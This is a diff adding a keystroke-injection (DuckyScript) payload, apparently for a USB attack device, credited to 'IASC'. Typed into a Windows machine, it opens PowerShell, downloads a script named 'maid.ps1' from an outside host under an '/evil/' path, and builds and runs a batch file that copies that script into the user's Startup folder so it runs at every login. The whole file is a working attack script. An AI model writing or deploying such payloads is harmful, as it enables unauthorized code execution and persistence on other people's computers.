@@ -1,0 +1,22 @@
+REM SCRIPT CREATED BY IASC
+GUI r
+DELAY 2000
+STRING powershell 
+ENTER
+DELAY 2000
+STRING wget "http://hiddenmask.online/evil/maid.ps1" -outfile "maid.ps1"
+ENTER
+DELAY 2500
+STRING New-Item -ItemType File -Path "copy.bat"
+ENTER
+DELAY 2000
+STRING Add-Content -Path .\*.bat -Exclude help* -Value 'color a'
+ENTER
+STRING Add-Content -Path .\*.bat -Exclude help* -Value 'XCOPY "\\127.0.0.1\Users\IASC\maid.PS1" "C:\Users\IASC\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" /S/R/H/I/D/Y/F'
+ENTER
+STRING Add-Content -Path .\*.bat -Exclude help* -Value 'timeoout 3'
+ENTER
+STRING Start-Process -FilePath "copy.bat"
+DELAY 1000
+STRING Exit
+ENTER
